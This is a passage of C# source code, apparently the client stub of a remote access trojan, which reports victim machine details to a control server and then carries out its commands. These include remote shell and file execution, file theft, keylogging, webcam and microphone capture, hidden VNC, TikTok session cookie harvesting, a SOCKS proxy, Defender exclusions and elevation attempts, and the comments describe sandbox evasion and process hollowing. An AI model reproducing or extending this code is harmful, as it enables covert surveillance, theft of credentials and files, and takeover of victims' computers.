using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace SeroStub;

internal class TlsClient : IDisposable
{
    private TcpClient? _tcp;
    private SslStream? _ssl;
    private readonly string _host;
    private readonly int _port;
    private readonly string _instanceId = Guid.NewGuid().ToString("N").Substring(0, 8);
    private readonly HashSet<string> _socksInitiated = [];

    // ── Priority write queue ─────────────────────────────────────────────────
    // Control packets (Pong, Heartbeat, etc.) go to _ctrlCh — always sent.
    // Frame packets (webcam, RDP) go to _frameCh — DropWrite when full so a
    // stalled frame write never starves Pong and triggers the server watchdog.
    private readonly System.Threading.Channels.Channel<Packet> _ctrlCh =
        System.Threading.Channels.Channel.CreateBounded<Packet>(
            new System.Threading.Channels.BoundedChannelOptions(128)
            { FullMode = System.Threading.Channels.BoundedChannelFullMode.Wait, SingleReader = true });
    private readonly System.Threading.Channels.Channel<Packet> _frameCh =
        System.Threading.Channels.Channel.CreateBounded<Packet>(
            new System.Threading.Channels.BoundedChannelOptions(2)
            { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropOldest, SingleReader = true });

    // ── Output channels (two-level write pipeline) ────────────────────────────
    // The WriteLoop serialises packets into byte[] and enqueues them to these
    // output channels.  A background SslWriterLoop drains them onto the SSL
    // stream.  This decouples the WriteLoop from network I/O so congestion on
    // frame writes can never block control packets (heartbeats, pongs, acks).
    private readonly System.Threading.Channels.Channel<byte[]> _ctrlOutCh =
        System.Threading.Channels.Channel.CreateBounded<byte[]>(
            new System.Threading.Channels.BoundedChannelOptions(64)
            { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropWrite, SingleReader = true, SingleWriter = true });
    private readonly System.Threading.Channels.Channel<byte[]> _frameOutCh =
        System.Threading.Channels.Channel.CreateBounded<byte[]>(
            new System.Threading.Channels.BoundedChannelOptions(2)
            { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropOldest, SingleReader = true, SingleWriter = true });

    private CancellationTokenSource? _sessionCts;

    /// <summary>False after Disconnect/Uninstall — caller should NOT reconnect.</summary>
    public bool ShouldReconnect { get; private set; } = true;

    // Shared HttpClient for public-IP lookup — one instance per process lifetime.
    private static readonly HttpClient _ipHttp = new() { Timeout = TimeSpan.FromSeconds(4) };

    private static async Task<string> FetchPublicIpAsync()
    {
        try
        {
            var ip = (await _ipHttp.GetStringAsync("https://api.ipify.org?format=text")).Trim();
            if (System.Net.IPAddress.TryParse(ip, out _)) return ip;
        }
        catch { }

        // Fallback to local network IP when offline or ipify is blocked
        try
        {
            foreach (var netInterface in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
            {
                if (netInterface.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up &&
                    netInterface.NetworkInterfaceType != System.Net.NetworkInformation.NetworkInterfaceType.Loopback)
                {
                    var props = netInterface.GetIPProperties();
                    foreach (var addr in props.UnicastAddresses)
                    {
                        if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork &&
                            !System.Net.IPAddress.IsLoopback(addr.Address))
                        {
                            return addr.Address.ToString();
                        }
                    }
                }
            }
        }
        catch { }

        return string.Empty;
    }

    public TlsClient(string host, int port)
    {
        _host = host;
        _port = port;
    }

    public async Task RunAsync(CancellationToken ct)
    {
        // Drain leftover queued items from any previous connection attempt.
        while (_ctrlCh.Reader.TryRead(out _)) {}
        while (_frameCh.Reader.TryRead(out _)) {}

        // Jitter: randomize initial connect time to defeat sandbox timing correlation
        await Task.Delay(Random.Shared.Next(100, 501), ct);
        _tcp = new TcpClient();
        _tcp.NoDelay = true; // disable Nagle — heartbeats and small ctrl packets send immediately
        await _tcp.ConnectAsync(_host, _port, ct);

        _ssl = new SslStream(_tcp.GetStream(), false, ValidateServerCert);
        await _ssl.AuthenticateAsClientAsync(_host).WaitAsync(ct);

        // Fetch real public IP before sending handshake so the server can display it
        // correctly even when the connection comes through a tunnel (localtonet, ngrok, etc.)
        var publicIp = await FetchPublicIpAsync();

        // Send client info with auth key
        ClientInfoData info;
        try
        {
            info = new ClientInfoData
            {
                OS = GetFriendlyOsName(),
                Username = GetDisplayUsername(),
                MachineName = Environment.MachineName,
                Hwid = GetHwid(),
                Payload = Config.EnableHollowing
                    ? $"{Config.HollowTarget} (RunPE)"
                    : Config.HiddenFileName,
                AuthKey = Config.AuthKey,
                IsAdmin = IsAdmin(),
                Antivirus = GetAntivirus(),
                IdPrefix = Config.ClientIdPrefix,
                InstanceId = _instanceId,
                IP = publicIp
            };
        }
        catch
        {
            throw;
        }

        await WritePacketAsync(new Packet
        {
            Type = PacketType.ClientInfo,
            Data = JsonSerializer.Serialize(info, SeroJson.Default.ClientInfoData)
        }, ct);

        // Session-scoped CTS — shared by all loops.  SslWriterLoop cancels it on
        // unrecoverable SSL errors so every loop exits and RunAsync reconnects.
        using var sessionCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
        _sessionCts = sessionCts;
        var sessionCt = sessionCts.Token;

        // Two-level write pipeline:
        //   SslWriterLoop (background) — drains output channels → SSL stream
        //   WriteLoop (background)     — serialises packets → output channels (never blocks on I/O)
        // HeartbeatSender (background) — produces heartbeats into _ctrlCh
        // Decoupling the WriteLoop from network I/O means frame congestion on the
        // tunnel can never stall control-packet delivery to the server watchdog.
        _ = SslWriterLoop(sessionCt);
        _ = WriteLoop(sessionCt);
        _ = HeartbeatSender(sessionCt);

        // Send hardware stats immediately so CPU/GPU/RAM appear on connect (not after 15s)
        _ = Task.Run(async () =>
        {
            try
            {
                await Task.Delay(600, ct);
                var cpu = SampleCpu();
                var hw  = SampleHardware(cpu);
                await WritePacketAsync(new Packet
                {
                    Type = PacketType.HardwareStats,
                    Data = JsonSerializer.Serialize(hw, SeroJson.Default.HardwareStatsStub)
                }, CancellationToken.None);
            }
            catch { }
        });

        // Report camera presence once on connect (reuse webcam MF enumeration)
        _ = Task.Run(async () =>
        {
            try
            {
                var hasCam = WebcamFeature.HasCamera() ? "Yes" : "No";
                await WritePacketAsync(new Packet { Type = PacketType.CameraStatus, Data = hasCam },
                                       CancellationToken.None);
            }
            catch { }
        });

        // Read loop - handles all incoming commands
        await ReadLoop(sessionCt);

        // Connection lost or server-initiated disconnect: clean up all active capture features.
        // HVNC must stop first so browser profile locks are released before the mic/cam.
        HvncFeature.Stop();
        MicrophoneFeature.Stop();
        RemoteDesktopFeature.Stop();
        WebcamFeature.Stop();
        // Keylogger: Stop() flushes buffered keystrokes to disk so they survive the reconnect.
        KeyloggerFeature.Stop();
    }

    // ── Detached process spawn via CreateProcessW ────────────────────────
    // LayoutKind.Explicit, Size=104: matches STARTUPINFOW exactly on x64.
    // Only cb matters — all other fields are zero (no window, no handles).
    [System.Runtime.InteropServices.StructLayout(
        System.Runtime.InteropServices.LayoutKind.Explicit, Size = 104)]
    private struct STARTUPINFOW_S {
        [System.Runtime.InteropServices.FieldOffset(0)] public uint cb;
    }
    [System.Runtime.InteropServices.StructLayout(
        System.Runtime.InteropServices.LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION_S { public IntPtr hProcess, hThread; public uint pid, tid; }

    [System.Runtime.InteropServices.DllImport("kernel32.dll",
        CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern bool CreateProcessW(
        IntPtr app, System.Text.StringBuilder cmd,
        IntPtr pa, IntPtr ta, bool inherit, uint flags,
        IntPtr env, IntPtr dir,
        ref STARTUPINFOW_S si, out PROCESS_INFORMATION_S pi);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr h);

    // DETACHED_PROCESS | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, no inherited handles
    private static bool _SpawnDetached(string cmdLine)
    {
        var si = new STARTUPINFOW_S { cb = 104 };
        var sb = new System.Text.StringBuilder(cmdLine);
        if (CreateProcessW(IntPtr.Zero, sb, IntPtr.Zero, IntPtr.Zero,
                false, 0x00000208u | 0x08000000u,
                IntPtr.Zero, IntPtr.Zero, ref si, out var pi))
        {
            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            if (pi.hThread  != IntPtr.Zero) CloseHandle(pi.hThread);
            return true;
        }
        return false;
    }

    private async Task ReadLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            var packet = await ReadPacketAsync(ct);
            if (packet == null) break; // Connection lost

            switch (packet.Type)
            {
                case PacketType.HeartbeatAck:
                    break;

                case PacketType.Ping:
                    // Fire-and-forget: don't block the read loop waiting for _writeLock.
                    // Same root cause as the server-side heartbeat fix — holding _writeLock
                    // in the read loop stalls all incoming packets (RDP acks, commands, etc.)
                    _ = WritePacketAsync(new Packet { Type = PacketType.Pong, Data = packet.Data }, ct);
                    break;

                case PacketType.RemoteShell:
                    _ = HandleShell(packet.Data, ct, PacketType.ShellOutput);
                    break;

                case PacketType.AutoTaskShell:
                    _ = HandleShell(packet.Data, ct, PacketType.AutoTaskShellOutput);
                    break;

                case PacketType.RemoteFileExec:
                    _ = HandleFileExec(packet.Data, ct);
                    break;

                case PacketType.RdpStart:
                {
                    var rdpCfg = System.Text.Json.JsonSerializer.Deserialize<RdpStartDataStub>(packet.Data, SeroJson.Default.RdpStartDataStub) ?? new();
                    _ = Task.Run(() => RemoteDesktopFeature.Start(rdpCfg,
                        async (t, d) => { if (!await WriteFrameAsync(new Packet { Type = (PacketType)t, Data = d }, ct)) RemoteDesktopFeature.SignalAck(); }));
                    break;
                }
                case PacketType.RdpStop:
                    _ = Task.Run(() => RemoteDesktopFeature.Stop());
                    break;
                case PacketType.RdpFrameAck:
                    RemoteDesktopFeature.SignalAck();
                    break;
                case PacketType.RdpGetMonitors:
                    RemoteDesktopFeature.SendMonitorListPublic(
                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct));
                    break;
                case PacketType.RdpInput:
                    RemoteDesktopFeature.HandleInput(packet.Data);
                    break;
                case PacketType.RdpClipboard:
                    RemoteDesktopFeature.HandleClipboard(packet.Data);
                    break;

                case PacketType.WcamStart:
                    var wcamCfg = System.Text.Json.JsonSerializer.Deserialize<WcamStartDataStub>(packet.Data, SeroJson.Default.WcamStartDataStub) ?? new();
                    _ = Task.Run(() => WebcamFeature.Start(wcamCfg,
                        async (t, d) => { if (!await WriteFrameAsync(new Packet { Type = (PacketType)t, Data = d }, ct)) WebcamFeature.SignalAck(); }));
                    break;
                case PacketType.WcamStop:
                    _ = Task.Run(() => WebcamFeature.Stop());
                    break;
                case PacketType.WcamFrameAck:
                    WebcamFeature.SignalAck();
                    break;

                case PacketType.HvncStart:
                {
                    var hvncStartCfg = System.Text.Json.JsonSerializer.Deserialize<HvncStartDataStub>(packet.Data, SeroJson.Default.HvncStartDataStub) ?? new();
                    _ = Task.Run(() => HvncFeature.Start(hvncStartCfg,
                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct)));
                    break;
                }
                case PacketType.HvncStop:
                    _ = Task.Run(() => HvncFeature.Stop());
                    break;
                case PacketType.HvncFrameAck:
                    HvncFeature.SignalAck();
                    break;
                case PacketType.HvncInput:
                    HvncFeature.HandleInput(packet.Data);
                    break;
                case PacketType.HvncExec:
                {
                    var hvncExec = System.Text.Json.JsonSerializer.Deserialize<HvncExecDataStub>(packet.Data, SeroJson.Default.HvncExecDataStub);
                    if (hvncExec != null && !string.IsNullOrWhiteSpace(hvncExec.Path))
                    {
                        bool clone = hvncExec.CloneBrowser;
                        string execPath = hvncExec.Path;
                        _ = Task.Run(() => HvncFeature.ExecOnDesktop(execPath, clone));
                    }
                    break;
                }
                case PacketType.HvncClipboard:
                    var hvncClip = System.Text.Json.JsonSerializer.Deserialize<HvncClipboardDataStub>(packet.Data, SeroJson.Default.HvncClipboardDataStub);
                    if (hvncClip != null)
                        HvncFeature.SetClipboard(hvncClip.Text ?? ""); // empty string = clear clipboard
                    break;

                case PacketType.Uninstall:
                    ShouldReconnect = false;
                    HandleUninstall();
                    return;

                case PacketType.RequestElevation:
                    _ = HandleElevation(false, ct);
                    break;

                case PacketType.RequestElevationLoop:
                    _ = HandleElevation(true, ct);
                    break;

                case PacketType.UpdateClient:
                    _ = HandleUpdateClient(packet.Data, ct);
                    break;

                case PacketType.DefenderExclude:
                    _ = Task.Run(() => HandleDefenderExclude(packet.Data));
                    break;

                case PacketType.PluginExec:
                    _ = HandlePluginExec(packet.Data, ct);
                    break;

                // ── TCP Manager ─────────────────────────────────────
                case PacketType.TcpGetList:
                    _ = Task.Run(async () => await WritePacketAsync(new Packet
                    {
                        Type = PacketType.TcpListResult,
                        Data = TcpManagerFeature.GetList()
                    }, CancellationToken.None));
                    break;

                case PacketType.TcpClose:
                    var tcpClose = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.TcpCloseDataStub);
                    if (tcpClose != null) TcpManagerFeature.Close(tcpClose.LocalAddr, tcpClose.RemoteAddr);
                    break;

                // ── Startup Manager ──────────────────────────────────
                case PacketType.StartupGetList:
                    _ = Task.Run(async () => await WritePacketAsync(new Packet
                    {
                        Type = PacketType.StartupListResult,
                        Data = StartupManagerFeature.GetList()
                    }, CancellationToken.None));
                    break;

                case PacketType.StartupDelete:
                    var startupDel = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.StartupDeleteDataStub);
                    if (startupDel != null)
                    {
                        var delName = startupDel.Name;
                        var delType = startupDel.Type;
                        var delLoc  = startupDel.Location;
                        _ = Task.Run(() => StartupManagerFeature.Delete(delName, delType, delLoc));
                    }
                    break;

                // ── File Manager ─────────────────────────────────────
                case PacketType.FmList:
                    var fmList = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmDownloadDataStub);
                    var fmListPath = fmList?.Path ?? "";
                    _ = Task.Run(async () => await WritePacketAsync(new Packet
                    {
                        Type = PacketType.FmListResult,
                        Data = FileManagerFeature.ListDirectory(fmListPath)
                    }, CancellationToken.None));
                    break;

                case PacketType.FmDownload:
                    var fmDl = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmDownloadDataStub);
                    if (fmDl != null)
                    {
                        var fmDlPath = fmDl.Path;
                        // Read+encode off the read loop — large files block for seconds inline
                        _ = Task.Run(async () => await WritePacketAsync(
                            new Packet { Type = PacketType.FmFileData, Data = FileManagerFeature.DownloadFile(fmDlPath) },
                            CancellationToken.None));
                    }
                    break;

                case PacketType.FmUpload:
                    var fmUp = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmUploadDataStub);
                    if (fmUp != null)
                    {
                        var fmUpPath = fmUp.Path;
                        var fmUpData = fmUp.Data;
                        _ = Task.Run(async () => await WritePacketAsync(
                            new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.UploadFile(fmUpPath, fmUpData) },
                            CancellationToken.None));
                    }
                    break;

                case PacketType.FmDelete:
                    var fmDel = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmDeleteDataStub);
                    if (fmDel != null)
                    {
                        var fmDelPath = fmDel.Path;
                        _ = Task.Run(async () => await WritePacketAsync(
                            new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.Delete(fmDelPath) },
                            CancellationToken.None));
                    }
                    break;

                case PacketType.FmRename:
                    var fmRen = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmRenameDataStub);
                    if (fmRen != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.Rename(fmRen.OldPath, fmRen.NewPath) }, ct);
                    break;

                case PacketType.FmMkDir:
                    var fmMk = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmMkDirDataStub);
                    if (fmMk != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.CreateDir(fmMk.Path) }, ct);
                    break;

                case PacketType.FmExec:
                    var fmEx = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmExecDataStub);
                    if (fmEx != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.Execute(fmEx.Path, fmEx.Mode) }, ct);
                    break;

                case PacketType.FmHash:
                    var fmHsh = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmHashDataStub);
                    if (fmHsh != null)
                    {
                        var fmHshPath = fmHsh.Path;
                        _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.FmHashResult, Data = FileManagerFeature.HashFile(fmHshPath) }, CancellationToken.None));
                    }
                    break;

                case PacketType.FmShowHide:
                    var fmSh = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmShowHideDataStub);
                    if (fmSh != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.ToggleHidden(fmSh.Path, fmSh.Hide) }, ct);
                    break;

                case PacketType.FmSetAttr:
                    var fmSa = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmSetAttrDataStub);
                    if (fmSa != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.SetAttributes(fmSa.Path, fmSa.Attributes) }, ct);
                    break;

                // ── Microphone ───────────────────────────────────────
                case PacketType.MicGetDevices:
                    _ = WritePacketAsync(new Packet
                    {
                        Type = PacketType.MicDevicesResult,
                        Data = MicrophoneFeature.GetDevices()
                    }, ct);
                    break;

                case PacketType.MicStart:
                    var micStart = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.MicStartDataStub);
                    if (micStart != null)
                    {
                        var micStartCopy = micStart;
                        _ = Task.Run(() => MicrophoneFeature.Start(micStartCopy.DeviceIndex, micStartCopy.SampleRate,
                            async data => await WritePacketAsync(new Packet { Type = PacketType.MicData, Data = data }, CancellationToken.None, dropIfBusy: true)));
                    }
                    break;

                case PacketType.MicStop:
                    _ = Task.Run(() => MicrophoneFeature.Stop());
                    break;

                // ── TikTok ───────────────────────────────────────────
                case PacketType.TikTokComment:
                    var ttCmd = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.TikTokCommentStub);
                    if (ttCmd != null)
                        _ = Task.Run(async () =>
                        {
                            var cookie = string.IsNullOrEmpty(ttCmd.Cookie)
                                ? TikTokFeature.DetectCookie()
                                : ttCmd.Cookie;
                            var (ok, err) = ttCmd.IsLiveroom
                                ? await TikTokFeature.CommentOnLive(ttCmd.VideoId, ttCmd.Text, cookie)
                                : await TikTokFeature.CommentOnVideo(ttCmd.VideoId, ttCmd.Text, cookie);
                            await WritePacketAsync(new Packet
                            {
                                Type = PacketType.TikTokCommentAck,
                                Data = JsonSerializer.Serialize(
                                    new TikTokCommentAckStub { Success = ok, Error = err },
                                    SeroJson.Default.TikTokCommentAckStub)
                            }, CancellationToken.None);
                        });
                    break;

                case PacketType.TikTokDetectCookie:
                    _ = Task.Run(async () =>
                    {
                        var c = TikTokFeature.DetectCookie();
                        await WritePacketAsync(new Packet
                        {
                            Type = PacketType.TikTokCookieResult,
                            Data = JsonSerializer.Serialize(
                                new TikTokCookieResultStub { Cookie = c, Found = !string.IsNullOrEmpty(c) },
                                SeroJson.Default.TikTokCookieResultStub)
                        }, CancellationToken.None);
                    });
                    break;

                // ── CDP Auto-Signup ──────────────────────────────────
                case PacketType.CdpSignupStart:
                    _ = Task.Run(async () =>
                    {
                        async Task SendStatus(string msg) =>
                            await WritePacketAsync(new Packet
                            {
                                Type = PacketType.CdpSignupStatus,
                                Data = JsonSerializer.Serialize(
                                    new CdpSignupStatusStub { Step = "info", Message = msg },
                                    SeroJson.Default.CdpSignupStatusStub)
                            }, CancellationToken.None);

                        var (ok, account, cookie, error) =
                            await TikTokCdpFeature.RunAsync(SendStatus, CancellationToken.None);
                        await WritePacketAsync(new Packet
                        {
                            Type = PacketType.CdpSignupResult,
                            Data = JsonSerializer.Serialize(
                                new CdpSignupResultStub { Success = ok, Account = account, Cookie = cookie, Error = error },
                                SeroJson.Default.CdpSignupResultStub)
                        }, CancellationToken.None);
                    });
                    break;

                // ── SOCKS5 Proxy ─────────────────────────────────────
                case PacketType.SocksStart:
                    Socks5Feature.Init(
                        async data => await WritePacketAsync(new Packet { Type = PacketType.SocksData, Data = data }, CancellationToken.None),
                        async sid  => await WritePacketAsync(new Packet
                        {
                            Type = PacketType.SocksClose,
                            Data = JsonSerializer.Serialize(new SocksDataStub { SessionId = sid, Data = "" }, SeroJson.Default.SocksDataStub)
                        }, CancellationToken.None),
                        async (sid, err) => await WritePacketAsync(new Packet
                        {
                            Type = err.Length == 0 ? PacketType.SocksConnOk : PacketType.SocksConnErr,
                            Data = JsonSerializer.Serialize(new SocksConnStub { SessionId = sid, Error = err }, SeroJson.Default.SocksConnStub)
                        }, CancellationToken.None));
                    break;

                case PacketType.SocksStop:
                    Socks5Feature.StopAll();
                    break;

                case PacketType.SocksData:
                    var socksD = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.SocksDataStub);
                    if (socksD != null)
                    {
                        byte[] raw;
                        try { raw = Convert.FromBase64String(socksD.Data); }
                        catch { break; } // malformed base64 — drop packet, keep connection alive
                        if (!_socksInitiated.Contains(socksD.SessionId))
                        {
                            _socksInitiated.Add(socksD.SessionId);
                            _ = Socks5Feature.HandleConnect(socksD.SessionId, raw);
                        }
                        else
                            _ = Socks5Feature.HandleData(socksD.SessionId, raw);
                    }
                    break;

                case PacketType.SocksClose:
                    var socksC = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.SocksDataStub);
                    if (socksC != null) { Socks5Feature.HandleClose(socksC.SessionId); _socksInitiated.Remove(socksC.SessionId); }
                    break;

                // ── Process Manager ─────────────────────────────────
                case PacketType.ProcGetList:
                    _ = Task.Run(async () => await WritePacketAsync(new Packet
                    {
                        Type = PacketType.ProcListResult,
                        Data = ProcessManagerFeature.GetProcessList()
                    }, CancellationToken.None));
                    break;

                case PacketType.ProcKill:
                    var procKill = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ProcKillDataStub);
                    if (procKill != null) ProcessManagerFeature.Kill(procKill.Pid);
                    break;

                // ── Performance Monitor ──────────────────────────────
                case PacketType.PerfMonStart:
                    var perfCfg = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.PerfMonStartStub);
                    _perfMonIntervalMs = perfCfg?.IntervalMs > 0 ? perfCfg.IntervalMs : 1000;
                    if (!_perfMonRunning)
                    {
                        _perfMonRunning = true;
                        _ = PerfMonLoop(ct);
                    }
                    break;

                case PacketType.PerfMonStop:
                    _perfMonRunning = false;
                    break;

                case PacketType.ProcSuspend:
                    var procSusp = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ProcSuspendResumeStub);
                    if (procSusp != null) ProcessManagerFeature.Suspend(procSusp.Pid);
                    break;

                case PacketType.ProcResume:
                    var procRes = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ProcSuspendResumeStub);
                    if (procRes != null) ProcessManagerFeature.Resume(procRes.Pid);
                    break;

                // ── TCP Firewall ─────────────────────────────────────
                case PacketType.TcpFirewallBlock:
                    var fwBlock = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.TcpFirewallBlockStub);
                    if (fwBlock != null)
                    {
                        var fwBlockCopy = fwBlock;
                        _ = Task.Run(async () =>
                        {
                            string fwResult = !string.IsNullOrEmpty(fwBlockCopy.RemoteIp)
                                ? TcpManagerFeature.BlockIp(fwBlockCopy.RemoteIp, fwBlockCopy.Direction)
                                : TcpManagerFeature.BlockProcess(fwBlockCopy.ProcessName, fwBlockCopy.Port, fwBlockCopy.Direction);
                            await WritePacketAsync(new Packet { Type = PacketType.TcpFirewallRulesResult, Data = fwResult }, CancellationToken.None);
                        });
                    }
                    break;

                case PacketType.TcpFirewallUnblock:
                    var fwUnblock = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.TcpFirewallUnblockStub);
                    if (fwUnblock != null)
                    {
                        var fwUnblockName = fwUnblock.RuleName;
                        _ = Task.Run(() => TcpManagerFeature.UnblockRule(fwUnblockName));
                    }
                    break;

                case PacketType.TcpFirewallListRules:
                    _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.TcpFirewallRulesResult, Data = TcpManagerFeature.ListFirewallRules() }, CancellationToken.None));
                    break;

                // ── Installed Apps ───────────────────────────────────
                case PacketType.InstalledGetList:
                    _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.InstalledListResult, Data = InstalledAppsFeature.GetList() }, CancellationToken.None));
                    break;

                case PacketType.InstalledUninstall:
                    var appUninstall = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.InstalledUninstallStub);
                    if (appUninstall != null) InstalledAppsFeature.Uninstall(appUninstall.UninstallString);
                    break;

                case PacketType.InstalledGetIcon:
                {
                    var iconReq = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.InstalledIconRequestStub);
                    if (iconReq != null)
                    {
                        var icoB64 = InstalledAppsFeature.GetIcon(iconReq.Name);
                        _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.InstalledIconResult, Data = JsonSerializer.Serialize(new InstalledIconResultStub { Name = iconReq.Name, IconB64 = icoB64 }, SeroJson.Default.InstalledIconResultStub) }, CancellationToken.None));
                    }
                    break;
                }

                // ── Service Manager ──────────────────────────────────
                case PacketType.SvcGetList:
                    _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.SvcListResult, Data = ServiceManagerFeature.GetList() }, CancellationToken.None));
                    break;

                case PacketType.SvcStart:
                case PacketType.SvcStop:
                case PacketType.SvcRestart:
                case PacketType.SvcDisable:
                case PacketType.SvcDelete:
                {
                    var svcAct = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.SvcActionStub);
                    if (svcAct != null)
                    {
                        var svcAction = packet.Type switch
                        {
                            PacketType.SvcStart   => "start",
                            PacketType.SvcStop    => "stop",
                            PacketType.SvcRestart => "restart",
                            PacketType.SvcDisable => "disable",
                            PacketType.SvcDelete  => "delete",
                            _                      => "stop"
                        };
                        _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.SvcAck, Data = ServiceManagerFeature.DoAction(svcAction, svcAct.ServiceName) }, CancellationToken.None));
                    }
                    break;
                }

                // ── Window Manager ───────────────────────────────────
                case PacketType.WinGetList:
                    _ = WritePacketAsync(new Packet { Type = PacketType.WinListResult, Data = WindowManagerFeature.GetList() }, ct);
                    break;

                case PacketType.WinAction:
                    var winAct = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.WinActionStub);
                    if (winAct != null) WindowManagerFeature.DoAction(winAct.Handle, winAct.Action);
                    break;

                // ── Registry Editor ──────────────────────────────────
                case PacketType.RegGetChildren:
                    var regGet = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegGetChildrenStub);
                    if (regGet != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.RegChildrenResult, Data = RegistryEditorFeature.GetChildren(regGet.KeyPath) }, ct);
                    break;

                case PacketType.RegSetValue:
                    var regSet = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegSetValueStub);
                    if (regSet != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.RegAck, Data = RegistryEditorFeature.SetValue(regSet.KeyPath, regSet.Name, regSet.ValueType, regSet.Data) }, ct);
                    break;

                case PacketType.RegDeleteValue:
                    var regDelVal = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegDeleteValueStub);
                    if (regDelVal != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.RegAck, Data = RegistryEditorFeature.DeleteValue(regDelVal.KeyPath, regDelVal.Name) }, ct);
                    break;

                case PacketType.RegDeleteKey:
                    var regDelKey = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegDeleteKeyStub);
                    if (regDelKey != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.RegAck, Data = RegistryEditorFeature.DeleteKey(regDelKey.KeyPath) }, ct);
                    break;

                case PacketType.RegCreateKey:
                    var regCreate = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegCreateKeyStub);
                    if (regCreate != null)
                        _ = WritePacketAsync(new Packet { Type = PacketType.RegAck, Data = RegistryEditorFeature.CreateKey(regCreate.KeyPath) }, ct);
                    break;

                // ── Device Manager ───────────────────────────────────
                case PacketType.DevGetList:
                    _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.DevListResult, Data = DeviceManagerFeature.GetList() }, CancellationToken.None));
                    break;

                case PacketType.DevUninstall:
                    var devUninst = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.DevUninstallStub);
                    if (devUninst != null)
                        _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.DevAck, Data = DeviceManagerFeature.Uninstall(devUninst.DeviceId) }, CancellationToken.None));
                    break;

                // ── Window Notify ────────────────────────────────────
                case PacketType.WindowNotifyKeywords:
                    var wnKwPkt = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.WindowNotifyKeywordsStub);
                    if (wnKwPkt != null)
                    {
                        _winNotifyKeywords = wnKwPkt.Keywords ?? [];
                        _winNotifyLastKeyword = "";
                        lock (_winNotifyCooldown) _winNotifyCooldown.Clear();
                    }
                    break;

                // ── Screenshot ───────────────────────────────────────
                case PacketType.Screenshot:
                    _ = Task.Run(async () =>
                    {
                        var jpeg = ScreenshotFeature.Capture(55);
                        await WritePacketAsync(new Packet
                        {
                            Type = PacketType.ScreenshotResult,
                            Data = JsonSerializer.Serialize(new ScreenshotResultStub { Data = jpeg },
                                       SeroJson.Default.ScreenshotResultStub)
                        }, CancellationToken.None);
                    });
                    break;

                // ── Keylogger ────────────────────────────────────────
                case PacketType.KeyloggerStart:
                    KeyloggerFeature.Start();
                    break;

                case PacketType.KeyloggerStop:
                    _ = Task.Run(() => KeyloggerFeature.Stop());
                    break;

                case PacketType.KeyloggerGetLogs:
